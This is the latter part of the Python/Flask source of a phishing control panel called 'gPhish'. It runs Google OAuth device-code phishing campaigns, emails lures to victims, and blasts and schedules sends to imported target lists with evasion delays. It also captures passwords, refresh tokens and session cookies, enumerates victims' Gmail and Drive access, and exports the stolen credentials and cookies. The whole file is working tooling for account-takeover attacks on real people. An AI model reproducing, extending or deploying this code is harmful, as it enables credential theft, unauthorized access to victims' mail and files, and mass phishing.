  <p><b>{{v.intel.identity.email}}</b> <span class="muted">({{v.captured}})</span></p>
  <pre>{{v.intel|tojson(indent=2)}}</pre>
  {% else %}<span class="muted">No victims yet.</span>{% endif %}
</div>

{% elif tab == 'campaigns' %}
{% if blasts %}
<div class="card"><h2>Blasts</h2>
<table><tr><th>ID</th><th>Progress</th><th>Status</th><th>Started</th><th></th></tr>
{% for b in blasts %}
<tr>
 <td class="muted">{{b.id}}</td>
 <td>{{b.sent|length}} sent / {{b.failed|length}} failed / {{b.emails|length}} total</td>
 <td><span class="badge {{'captured' if b.status=='done' else ('waiting' if b.status=='running' else 'expired')}}">{{b.status}}</span></td>
 <td class="muted">{{b.started}}</td>
 <td>{% if b.status == 'interrupted' %}
   <form method="post" action="/blast/resume/{{b.id}}">
     <button class="small ghost" type="submit">↻ Resume</button></form>
 {% endif %}</td>
</tr>
{% endfor %}
</table></div>
{% endif %}
<div class="card"><h2>Launch new campaign</h2>
 <form method="post" action="/start">
  <div class="row">
   <div><label>OAuth Client ID *</label>
     <input name="client_id" required value="{{settings.last_client_id}}"
            placeholder="XXXX.apps.googleusercontent.com"></div>
   <div><label>Victim email (blank = manual lure)</label>
     <input name="victim" placeholder="victim@target.com"></div>
  </div>
  <div class="row">
   <div><label>SMTP user</label><input name="smtp_user" value="{{settings.smtp_user}}"></div>
   <div><label>SMTP password</label><input name="smtp_pass" type="password"></div>
   <div><label>SMTP host</label><input name="smtp_host" value="{{settings.smtp_host}}"></div>
  </div>
  <button type="submit">▶ Launch campaign</button>
 </form>
</div>
<div class="card"><h2>Campaigns <span class="muted">(auto-refresh 8s)</span></h2>
<table><tr><th>Time</th><th>Code / URL</th><th>Victim</th><th>Status</th>
<th>Tokens</th><th>Intel</th><th></th></tr>
{% for c in campaigns %}
<tr>
 <td class="muted">{{c.created}}</td>
 <td><span class="bigcode">{{c.code}}</span><br>
     <a href="{{c.url}}" target="_blank">{{c.url}}</a></td>
 <td>{{c.victim or '—'}}</td>
 <td><span class="badge {{c.status}}">{{c.status}}</span></td>
 <td>{% if c.tokens %}<details><summary>tokens</summary>
   <pre>{{c.tokens|tojson(indent=2)}}</pre></details>{% else %}—{% endif %}</td>
 <td>{% if c.intel %}<details><summary>{{c.intel.identity.email}}</summary>
   <pre>{{c.intel|tojson(indent=2)}}</pre></details>{% else %}—{% endif %}</td>
 <td>{% if c.tokens and c.tokens.refresh_token %}
   <form method="post" action="/enum/{{c.id}}">
     <button class="small ghost" type="submit">↻ Re-enum</button></form>{% endif %}
   <form method="post" action="/delete/{{c.id}}" style="margin-top:6px">
     <button class="small danger" type="submit">✕ Delete</button></form></td>
</tr>
{% else %}<tr><td colspan="7" class="muted">No campaigns yet.</td></tr>{% endfor %}
</table></div>

{% elif tab == 'victims' %}
{% for v in victims %}
<div class="card"><h2>{{v.intel.identity.email}}
  <span class="muted">— captured {{v.captured}}</span></h2>
 <div class="row">
   <div class="stat" style="flex:1"><div class="lbl">Gmail</div>
     <div>{% if v.intel.gmail.accessible %}✅ {{v.intel.gmail.messages}} msgs{% else %}❌ blocked{% endif %}</div></div>
   <div class="stat" style="flex:1"><div class="lbl">Drive</div>
     <div>{% if v.intel.drive.accessible %}✅ {{v.intel.drive.get('used_gb','?')}} GB{% else %}❌ blocked{% endif %}</div></div>
   <div class="stat" style="flex:1"><div class="lbl">Scopes</div>
     <div>{{v.intel.scopes|join(', ')}}</div></div>
 </div>
 <details><summary>Refresh token</summary>
   <pre>{{v.refresh_token}}</pre></details>
 <details><summary>Full intel</summary>
   <pre>{{v.intel|tojson(indent=2)}}</pre></details>
 {% if v.refresh_token %}
 <form method="post" action="/enum/{{v.id}}" style="margin-top:10px">
   <button class="ghost" type="submit">↻ Re-enumerate now</button></form>
 {% endif %}
</div>
{% else %}<div class="card"><span class="muted">No victims captured yet.</span></div>{% endfor %}

{% elif tab == 'creds' %}
<div class="card"><h2>Credential captures ({{creds|length}})</h2>
 <p class="muted">Sources: lure_server.py pushes via the ingest API
   (tagged <b>lure:&lt;campaign-id&gt;</b>); local /login fallback if enabled.
   <a href="/export/cookies/txt">Cookies .txt</a> ·
   <a href="/export/cookies/json">Cookies .json</a> ·
   <a href="/export/creds/csv">Creds CSV</a></p>
 <table>
 <tr><th>Time</th><th>Email</th><th>Password</th><th>Refresh token</th>
     <th>Cookies</th><th>IP</th><th>Source</th><th></th></tr>
 {% for c in creds %}
 <tr>
  <td class="muted">{{c.time}}</td>
  <td><b>{{c.email}}</b></td>
  <td><code class="pw">{{c.password or '—'}}</code></td>
  <td>{% if c.refresh_token %}
    <details><summary class="okbg badge">RT ✔</summary>
      <pre>{{c.refresh_token}}</pre></details>
    {% else %}<span class="muted">—</span>{% endif %}</td>
  <td>{% if c.cookies %}
    <details><summary class="badge waiting">{{ (c.cookies|length) }} bytes</summary>
      <pre>{{c.cookies}}</pre></details>
    {% else %}<span class="muted">—</span>{% endif %}</td>
  <td class="muted">{{c.ip}}</td>
  <td class="muted">{{c.source or 'panel'}}</td>
  <td><form method="post" action="/creds/delete/{{loop.index0}}">
    <button class="small danger" type="submit">✕</button></form></td>
 </tr>
 {% else %}<tr><td colspan="8" class="muted">No creds captured yet.</td></tr>{% endfor %}
 </table>
</div>
<div class="card"><h2>Attach a refresh token manually</h2>
 <p class="muted">Attaches to the most recent matching cred entry by email.</p>
 <form method="post" action="/creds/add_token">
  <div class="row">
   <div><label>Email (must match a cred entry)</label>
     <input name="email" placeholder="victim@target.com"></div>
  </div>
  <div class="row">
   <div style="flex:3"><label>Refresh token</label>
     <textarea name="refresh_token" rows="3"></textarea></div>
  </div>
  <button type="submit" class="ghost">🔗 Attach token</button>
 </form>
</div>

{% elif tab == 'mailing' %}
{% if schedules %}
<div class="card"><h2>Scheduled blasts</h2>
<table><tr><th>List</th><th>Run at</th><th>Status</th><th></th></tr>
{% for s in schedules %}
<tr><td>{{s.list_name}}</td><td class="muted">{{s.run_at}}</td>
    <td><span class="badge {{'captured' if s.status=='done' else ('waiting' if s.status in ('pending','running') else 'expired')}}">{{s.status}}</span></td>
    <td>{% if s.status == 'pending' %}
      <form method="post" action="/mailing/schedule/cancel/{{s.id}}">
        <button class="small danger" type="submit">✕ Cancel</button></form>
    {% endif %}</td></tr>
{% endfor %}
</table></div>
{% endif %}
<div class="card"><h2>Create / import mailing list</h2>
 <form method="post" action="/mailing/add">
  <div class="row">
   <div><label>List name</label><input name="name" placeholder="finance-team"></div>
  </div>
  <div class="row">
   <div style="flex:3"><label>Emails (one per line or comma-separated)</label>
     <textarea name="emails" rows="5" placeholder="a@target.com&#10;b@target.com"></textarea></div>
  </div>
  <button type="submit">＋ Save list</button>
 </form>
 <form method="post" action="/mailing/upload" enctype="multipart/form-data"
       style="margin-top:12px">
  <div class="row">
   <div><label>Or upload .txt / .csv file</label><input type="file" name="file"></div>
   <div><label>List name</label><input name="name"></div>
  </div>
  <button type="submit" class="ghost">⬆ Import file</button>
 </form>
</div>
{% for l in lists %}
<div class="card"><h2>{{l.name}}
  <span class="muted">— {{l.emails|length}} emails · {{l.created}}</span></h2>
 <details><summary>recipients</summary>
   <pre>{{l.emails|join('\n')}}</pre></details>
 <form method="post" action="/mailing/blast/{{l.name}}" style="margin-top:10px">
  <div class="row">
   <div><label>OAuth Client ID for blast</label>
     <input name="client_id" value="{{settings.last_client_id}}"
            placeholder="XXXX.apps.googleusercontent.com"></div>
  </div>
  <button type="submit">🚀 Launch blast ({{l.emails|length}} targets)</button>
 </form>
 <details style="margin-top:10px"><summary>⏰ Schedule this blast</summary>
  <form method="post" action="/mailing/schedule/{{l.name}}" style="margin-top:10px">
   <div class="row">
    <div><label>Run at (date &amp; time, panel timezone)</label>
      <input type="datetime-local" name="run_at" required></div>
    <div><label>OAuth Client ID</label>
      <input name="client_id" value="{{settings.last_client_id}}"></div>
   </div>
   <button type="submit" class="ghost">⏰ Schedule</button>
  </form>
 </details>
 <form method="post" action="/mailing/delete/{{l.name}}" style="margin-top:6px">
   <button class="small danger" type="submit">✕ Delete list</button></form>
</div>
{% else %}
<div class="card"><span class="muted">No mailing lists yet.</span></div>
{% endfor %}

{% elif tab == 'sends' %}
<div class="card"><h2>Lure send log ({{sends|length}})</h2>
<table><tr><th>Time</th><th>Email</th><th>Status</th><th>Campaign</th></tr>
{% for s in sends %}
<tr><td class="muted">{{s.time}}</td><td>{{s.email}}</td>
    <td>{{s.status}}</td><td class="muted">{{s.campaign_id}}</td></tr>
{% else %}<tr><td colspan="4" class="muted">No sends yet.</td></tr>{% endfor %}
</table></div>

{% elif tab == 'settings' %}
<div class="card"><h2>Settings</h2>
 <form method="post" action="/settings">
  <div class="row">
   <div><label>Panel domain (admin only — never shared)</label>
     <input name="panel_domain" value="{{settings.panel_domain}}"
            placeholder="panel-yours.ngrok-free.dev"></div>
   <div><label>Lure domain (victims — MUST differ from panel)</label>
     <input name="lure_domain" value="{{settings.lure_domain}}"
            placeholder="https://login.yourluredomain.com"></div>
  </div>
  <div class="row">
   <div><label>Sending / mail domain (lure sender)</label>
     <input name="mail_domain" value="{{settings.mail_domain}}"
            placeholder="mail.yourdomain.com"></div>
   <div><label>Server TZ offset (hours)</label>
     <input name="tz_offset_hours" type="number"
            value="{{settings.tz_offset_hours}}"></div>
  </div>
  <div class="row">
   <div><label>Webhook URL (Discord/Slack)</label>
     <input name="webhook_url" value="{{settings.webhook_url}}"></div>
  </div>
  <div class="row">
   <div><label>SMTP host</label><input name="smtp_host" value="{{settings.smtp_host}}"></div>
   <div><label>SMTP user</label><input name="smtp_user" value="{{settings.smtp_user}}"></div>
   <div><label>SMTP password</label><input name="smtp_pass" type="password" value="{{settings.smtp_pass}}"></div>
  </div>
  <div class="row">
   <div><label>Lure subject</label>
     <input name="lure_subject" value="{{settings.lure_subject}}"></div>
   <div><label>Sender display name</label>
     <input name="lure_sender_name" value="{{settings.lure_sender_name}}"></div>
  </div>
  <div class="row">
   <div style="flex:3"><label>Custom lure HTML template — use {url} and {code}
     (blank = default)</label>
     <textarea name="lure_template" rows="4">{{settings.lure_template}}</textarea></div>
  </div>
  <div class="row">
   <div><label>Creds page title (local fallback only)</label>
     <input name="creds_page_title" value="{{settings.creds_page_title}}"></div>
   <div><label>Redirect after local login capture</label>
     <input name="after_login_redirect" value="{{settings.after_login_redirect}}"></div>
  </div>
  <div class="row">
   <div><label>Send delay (sec min)</label>
     <input name="send_delay_min" type="number" value="{{settings.send_delay_min}}"></div>
   <div><label>Jitter (sec 0-N)</label>
     <input name="send_jitter" type="number" value="{{settings.send_jitter}}"></div>
   <div><label>Max workers</label>
     <input name="max_workers" type="number" value="{{settings.max_workers}}"></div>
   <div><label>Poll interval (sec)</label>
     <input name="poll_interval" type="number" value="{{settings.poll_interval}}"></div>
   <div><label>Archive after (days, 0=off)</label>
     <input name="archive_days" type="number" value="{{settings.archive_days}}"></div>
   <div><label>Late tolerance (min)</label>
     <input name="late_tolerance_min" type="number"
            value="{{settings.late_tolerance_min}}"></div>
  </div>
  <div class="row">
   <div style="flex:3"><label>OAuth scopes (one per line)</label>
     <textarea name="scopes" rows="4">{{settings.scopes|join('\n')}}</textarea></div>
  </div>
  <div class="row" style="font-size:14px">
   <div><label><input type="checkbox" name="auto_enum"
     {{'checked' if settings.auto_enum}} style="width:auto"> Auto-enumerate on capture</label></div>
   <div><label><input type="checkbox" name="notify_on_capture"
     {{'checked' if settings.notify_on_capture}} style="width:auto"> Webhook on capture</label></div>
   <div><label><input type="checkbox" name="notify_on_send"
     {{'checked' if settings.notify_on_send}} style="width:auto"> Webhook on lure sent</label></div>
   <div><label><input type="checkbox" name="notify_on_creds"
     {{'checked' if settings.notify_on_creds}} style="width:auto"> Webhook on creds</label></div>
   <div><label><input type="checkbox" name="creds_enabled"
     {{'checked' if settings.creds_enabled}} style="width:auto"> Local /login fallback (testing only)</label></div>
  </div>
  <button type="submit">💾 Save settings</button>
 </form>
</div>

{% elif tab == 'logs' %}
<div class="card"><h2>Event log ({{logs|length}})</h2>
 {% for l in logs %}<div class="logline {{l.level}}"><span class="t">{{l.time}}</span>[{{l.level|upper}}] {{l.msg}}</div>
 {% else %}<span class="muted">Empty.</span>{% endfor %}
</div>
{% endif %}

</main>
{% if tab == 'campaigns' %}<script>setInterval(()=>location.reload(),8000);</script>{% endif %}
</body></html>"""

# ---------- routes ----------
@app.route("/")
@app.route("/<name>")
@require_auth
def tab(name="dashboard"):
    if name not in ("dashboard", "campaigns", "victims", "creds",
                    "mailing", "sends", "settings", "logs"):
        name = "dashboard"
    (act, panel_cfg, lure_cfg, mail_cfg,
     panel_match, separation, mail_relation) = domain_status()
    return render_template_string(
        TPL, tab=name,
        campaigns=DATA["campaigns"], victims=DATA["victims"],
        creds=DATA["creds"], logs=DATA["logs"], settings=DATA["settings"],
        lists=DATA["mailing_lists"], sends=DATA["sends"],
        schedules=DATA["schedules"], blasts=DATA["blasts"],
        active_domain=act, panel_cfg=panel_cfg, lure_cfg=lure_cfg,
        mail_cfg=mail_cfg, panel_match=panel_match,
        separation=separation, mail_relation=mail_relation,
        now=now_str()[:16])

@app.route("/start", methods=["POST"])
@require_auth
def start():
    s = DATA["settings"]
    cid = request.form["client_id"].strip()
    s["last_client_id"] = cid
    victim = request.form.get("victim", "").strip()
    smtp_user = request.form.get("smtp_user", "").strip() or s["smtp_user"]
    smtp_pass = request.form.get("smtp_pass", "").strip() or s["smtp_pass"]
    smtp_host = request.form.get("smtp_host", "").strip() or s["smtp_host"]
    try:
        dev = get_device_code(cid, s["scopes"])
    except Exception as e:
        log("error", f"Device flow failed: {e}")
        return redirect(url_for("tab", name="campaigns"))
    camp = {
        "id": uuid.uuid4().hex[:12], "client_id": cid, "device": dev,
        "url": dev["verification_url"], "code": dev["user_code"],
        "status": "waiting", "expires": time.time() + dev.get("expires_in", 900),
        "victim": victim, "tokens": None, "intel": None,
        "created": now_str()}
    DATA["campaigns"].insert(0, camp)
    log("info", f"Campaign launched — code {camp['code']} for {victim or 'manual lure'}")
    if victim and smtp_user and smtp_pass:
        try:
            s_copy = dict(s)
            s_copy.update(smtp_user=smtp_user, smtp_pass=smtp_pass,
                          smtp_host=smtp_host)
            DATA["settings"] = s_copy
            send_lure_email(victim, dev["verification_url"], dev["user_code"])
            log("info", f"Lure sent to {victim}")
        except Exception as e:
            log("error", f"Lure failed: {e}")
    save()
    threading.Thread(target=poll_campaign, args=(camp["id"],),
                     daemon=True).start()
    return redirect(url_for("tab", name="campaigns"))

@app.route("/enum/<camp_id>", methods=["POST"])
@require_auth
def enum(camp_id):
    v = next((v for v in DATA["victims"] if v["id"] == camp_id), None)
    if not v:
        c = next((c for c in DATA["campaigns"] if c["id"] == camp_id), None)
        if c and c.get("tokens", {}).get("refresh_token"):
            v = {"id": c["id"], "client_id": c["client_id"],
                 "refresh_token": c["tokens"]["refresh_token"],
                 "intel": c.get("intel")}
    if v and v.get("refresh_token"):
        at = refresh_access_token(v["client_id"], v["refresh_token"])
        if at:
            v["intel"] = enumerate_access(at)
            log("success", f"Re-enum complete: "
                           f"{v['intel']['identity'].get('email')}")
            save()
    return redirect(request.referrer or url_for("tab", name="victims"))

@app.route("/delete/<camp_id>", methods=["POST"])
@require_auth
def delete(camp_id):
    DATA["campaigns"] = [c for c in DATA["campaigns"] if c["id"] != camp_id]
    save()
    return redirect(url_for("tab", name="campaigns"))

@app.route("/blast/resume/<blast_id>", methods=["POST"])
@require_auth
def blast_resume(blast_id):
    b = next((x for x in DATA["blasts"] if x["id"] == blast_id), None)
    if b and b["status"] == "interrupted":
        threading.Thread(target=bulk_send,
                         args=([], b["client_id"], b["id"], True),
                         daemon=True).start()
    return redirect(url_for("tab", name="campaigns"))

@app.route("/lure/status")
@require_auth
def lure_status():
    """Check the lure server is up and report its campaign stats."""
    base = (DATA["settings"].get("lure_domain") or "").strip().rstrip("/")
    if not base:
        return "Lure domain not configured. Set it in Settings.", 400
    if not base.startswith("http"):
        base = "https://" + base
    try:
        r = requests.get(f"{base}/captures",
                         params={"key": os.environ.get("LURE_KEY", "")},
                         timeout=8)
        if r.status_code == 403:
            return "Lure server reachable, but LURE_KEY mismatch between panel and lure server.", 502
        r.raise_for_status()
        d = r.json()
        camps = d.get("campaigns", [])
        caps = d.get("captures", [])
        return (f"Lure server OK at {base} — {len(camps)} campaigns, "
                f"{sum(c.get('visits',0) for c in camps)} visits, "
                f"{len(caps)} captures.")
    except Exception as e:
        return f"Lure server unreachable at {base}: {e}", 502

@app.route("/creds/delete/<int:idx>", methods=["POST"])
@require_auth
def creds_delete(idx):
    if 0 <= idx < len(DATA["creds"]):
        removed = DATA["creds"].pop(idx)
        log("info", f"Cred entry deleted: {removed.get('email')}")
        save()
    return redirect(url_for("tab", name="creds"))

@app.route("/creds/add_token", methods=["POST"])
@require_auth
def creds_add_token():
    email = request.form.get("email", "").strip()
    rt = request.form.get("refresh_token", "").strip()
    if email and rt:
        if attach_rt_to_cred(email, rt):
            log("info", f"Refresh token attached to cred entry: {email}")
        else:
            DATA["creds"].insert(0, {
                "time": now_str(), "email": email, "password": "",
                "cookies": "", "refresh_token": rt,
                "ip": "", "ua": "(manual refresh token entry)"})
            log("info", f"Standalone refresh token entry created: {email}")
            save()
    return redirect(url_for("tab", name="creds"))

# ---------- mailing lists ----------
@app.route("/mailing/add", methods=["POST"])
@require_auth
def mailing_add():
    name = request.form.get("name", "").strip() \
        or f"list-{len(DATA['mailing_lists'])+1}"
    raw = request.form.get("emails", "")
    emails = [e.strip() for e in re.split(r"[\n,;\s]+", raw) if e.strip()]
    valid = [e for e in emails if EMAIL_RE.match(e)]
    deduped = list(dict.fromkeys(valid))
    DATA["mailing_lists"].insert(0, {
        "name": name, "emails": deduped, "created": now_str()[:16]})
    log("info", f"Mailing list '{name}' saved ({len(deduped)} emails, "
                f"{len(emails)-len(deduped)} invalid/dupes dropped)")
    save()
    return redirect(url_for("tab", name="mailing"))

@app.route("/mailing/upload", methods=["POST"])
@require_auth
def mailing_upload():
    f = request.files.get("file")
    if not f:
        return redirect(url_for("tab", name="mailing"))
    raw = f.read().decode("utf-8", errors="ignore")
    emails = []
    if f.filename.endswith(".csv"):
        for row in csv.reader(raw.splitlines()):
            for cell in row:
                cell = cell.strip()
                if EMAIL_RE.match(cell):
                    emails.append(cell)
    else:
        emails = [e.strip() for e in raw.split() if EMAIL_RE.match(e.strip())]
    name = (request.form.get("name", "").strip()
            or f.filename.rsplit(".", 1)[0])
    deduped = list(dict.fromkeys(emails))
    DATA["mailing_lists"].insert(0, {
        "name": name, "emails": deduped, "created": now_str()[:16]})
    log("info", f"Mailing list '{name}' imported from file "
                f"({len(deduped)} emails)")
    save()
    return redirect(url_for("tab", name="mailing"))

@app.route("/mailing/delete/<name>", methods=["POST"])
@require_auth
def mailing_delete(name):
    DATA["mailing_lists"] = [l for l in DATA["mailing_lists"]
                             if l["name"] != name]
    save()
    return redirect(url_for("tab", name="mailing"))

@app.route("/mailing/blast/<name>", methods=["POST"])
@require_auth
def mailing_blast(name):
    lst = next((l for l in DATA["mailing_lists"] if l["name"] == name), None)
    if not lst:
        return redirect(url_for("tab", name="mailing"))
    client_id = request.form.get("client_id", "").strip() \
        or DATA["settings"]["last_client_id"]
    if not client_id:
        log("error", "Blast aborted: no client ID")
        return redirect(url_for("tab", name="mailing"))
    DATA["settings"]["last_client_id"] = client_id
    save()
    threading.Thread(target=bulk_send, args=(lst["emails"], client_id),
                     daemon=True).start()
    log("info", f"Blast launched in background: {name} "
                f"({len(lst['emails'])} targets)")
    return redirect(url_for("tab", name="campaigns"))

@app.route("/mailing/schedule/<name>", methods=["POST"])
@require_auth
def mailing_schedule(name):
    lst = next((l for l in DATA["mailing_lists"] if l["name"] == name), None)
    if not lst:
        return redirect(url_for("tab", name="mailing"))
    run_at = request.form.get("run_at", "").strip()
    client_id = request.form.get("client_id", "").strip() \
        or DATA["settings"]["last_client_id"]
    try:
        datetime.datetime.fromisoformat(run_at)
    except ValueError:
        log("error", f"Schedule for '{name}' rejected: bad datetime '{run_at}'")
        return redirect(url_for("tab", name="mailing"))
    if not client_id:
        log("error", "Schedule aborted: no client ID")
        return redirect(url_for("tab", name="mailing"))
    DATA["schedules"].insert(0, {
        "id": uuid.uuid4().hex[:12], "list_name": name,
        "run_at": run_at, "client_id": client_id, "status": "pending",
        "created": now_str()[:16]})
    log("info", f"Blast scheduled: '{name}' at {run_at} "
                f"({len(lst['emails'])} targets)")
    save()
    return redirect(url_for("tab", name="mailing"))

@app.route("/mailing/schedule/cancel/<sch_id>", methods=["POST"])
@require_auth
def schedule_cancel(sch_id):
    sch = next((s for s in DATA["schedules"] if s["id"] == sch_id), None)
    if sch and sch["status"] == "pending":
        sch["status"] = "cancelled"
        log("info", f"Scheduled blast '{sch['list_name']}' cancelled")
        save()
    return redirect(url_for("tab", name="mailing"))

# ---------- settings ----------
@app.route("/settings", methods=["POST"])
@require_auth
def settings():
    s = DATA["settings"]
    def g(k): return request.form.get(k, "").strip()
    s["panel_domain"] = g("panel_domain")
    s["lure_domain"]  = g("lure_domain")
    s["mail_domain"]  = g("mail_domain")
    s["webhook_url"] = g("webhook_url")
    s["smtp_host"]   = g("smtp_host")
    s["smtp_user"]   = g("smtp_user")
    if g("smtp_pass"):
        s["smtp_pass"] = g("smtp_pass")
    s["lure_subject"]     = g("lure_subject") or s["lure_subject"]
    s["lure_sender_name"] = g("lure_sender_name") or s["lure_sender_name"]
    s["lure_template"]    = request.form.get("lure_template", "")
    s["creds_page_title"] = g("creds_page_title") or s["creds_page_title"]
    s["after_login_redirect"] = g("after_login_redirect")
    for k in ("send_delay_min", "send_jitter", "max_workers",
              "poll_interval", "archive_days", "late_tolerance_min"):
        try:
            s[k] = max(0, int(g(k)))
        except ValueError:
            pass
    try:
        s["tz_offset_hours"] = float(g("tz_offset_hours") or 0)
    except ValueError:
        pass
    s["auto_enum"]         = request.form.get("auto_enum") == "on"
    s["notify_on_send"]    = request.form.get("notify_on_send") == "on"
    s["notify_on_capture"] = request.form.get("notify_on_capture") == "on"
    s["notify_on_creds"]   = request.form.get("notify_on_creds") == "on"
    s["creds_enabled"]     = request.form.get("creds_enabled") == "on"
    scopes = [x.strip() for x in g("scopes").replace("\n", " ").split()
              if x.strip()]
    if scopes:
        s["scopes"] = scopes
    log("info", "Settings updated")
    save()
    return redirect(url_for("tab", name="settings"))

# ---------- exports ----------
@app.route("/export/json")
@require_auth
def export_json():
    out = json.dumps({
        "victims": DATA["victims"],
        "creds": [{k: v for k, v in c.items()
                   if not k.startswith("_")} for c in DATA["creds"]],
        "blasts": DATA["blasts"],
        "campaigns": [{k: v for k, v in c.items() if k != "device"}
                      for c in DATA["campaigns"]]}, indent=2)
    resp = Response(out, mimetype="application/json")
    resp.headers["Content-Disposition"] = \
        'attachment; filename="gphish_report.json"'
    return resp

@app.route("/export/csv")
@require_auth
def export_csv():
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["captured", "email", "name", "hosted_domain",
                "gmail_accessible", "gmail_messages", "drive_accessible",
                "drive_used_gb", "scopes", "refresh_token"])
    for v in DATA["victims"]:
        i = v.get("intel", {})
        ident = i.get("identity", {})
        g_, d_ = i.get("gmail", {}), i.get("drive", {})
        w.writerow([v.get("captured", ""), ident.get("email", ""),
                    ident.get("name", ""), ident.get("hd", ""),
                    g_.get("accessible", False), g_.get("messages", ""),
                    d_.get("accessible", False), d_.get("used_gb", ""),
                    "; ".join(i.get("scopes", [])),
                    v.get("refresh_token", "")])
    resp = Response(buf.getvalue(), mimetype="text/csv")
    resp.headers["Content-Disposition"] = \
        'attachment; filename="gphish_report.csv"'
    return resp

@app.route("/export/creds/csv")
@require_auth
def export_creds_csv():
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["captured", "email", "password", "refresh_token",
                "cookies", "ip", "user_agent", "source"])
    for c in DATA["creds"]:
        if c.get("_pending_cookies"):
            continue
        w.writerow([c.get("time", ""), c.get("email", ""),
                    c.get("password", ""), c.get("refresh_token", ""),
                    c.get("cookies", ""), c.get("ip", ""),
                    c.get("ua", ""), c.get("source", "panel")])
    resp = Response(buf.getvalue(), mimetype="text/csv")
    resp.headers["Content-Disposition"] = \
        'attachment; filename="gphish_creds.csv"'
    return resp

@app.route("/export/cookies/txt")
@require_auth
def export_cookies_txt():
    entries = creds_with_cookies()
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    out = io.StringIO()
    out.write(f"# gPhish cookie export — {now_str()}\n")
    out.write(f"# {len(entries)} capture(s) with cookies\n\n")
    for c in entries:
        out.write(f"# ---- {c.get('email')} | {c.get('time')} | "
                  f"IP {c.get('ip')} | {c.get('source', 'panel')} ----\n")
        out.write(c["cookies"] + "\n\n")
    resp = Response(out.getvalue(), mimetype="text/plain")
    resp.headers["Content-Disposition"] = \
        f'attachment; filename="gphish_cookies_{ts}.txt"'
    return resp

@app.route("/export/cookies/json")
@require_auth
def export_cookies_json():
    entries = creds_with_cookies()
    out = []
    for c in entries:
        pairs = {}
        for part in c["cookies"].split(";"):
            if "=" in part:
                k, _, v = part.strip().partition("=")
                pairs[k] = v
        out.append({
            "captured": c.get("time", ""),
            "email": c.get("email", ""),
            "ip": c.get("ip", ""),
            "user_agent": c.get("ua", ""),
            "source": c.get("source", "panel"),
            "cookie_string": c["cookies"],
            "cookies": pairs,
        })
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    resp = Response(json.dumps(
        {"exported": now_str(), "count": len(out), "captures": out},
        indent=2), mimetype="application/json")
    resp.headers["Content-Disposition"] = \
        f'attachment; filename="gphish_cookies_{ts}.json"'
    return resp

if __name__ == "__main__":
    threading.Thread(target=scheduler_loop, daemon=True).start()
    if os.environ.get("GPANEL_HTTP") == "1":
        log("info", "Panel started (HTTP 0.0.0.0:5443 — behind proxy/tunnel)")
        app.run(host="0.0.0.0", port=5443, debug=False)
    else:
        log("info", "Panel started (HTTPS :5443, scheduler active)")
        make_selfsigned_cert()
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain("panel.pem", "panel-key.pem")
        app.run(host="0.0.0.0", port=5443, ssl_context=ctx, debug=False)
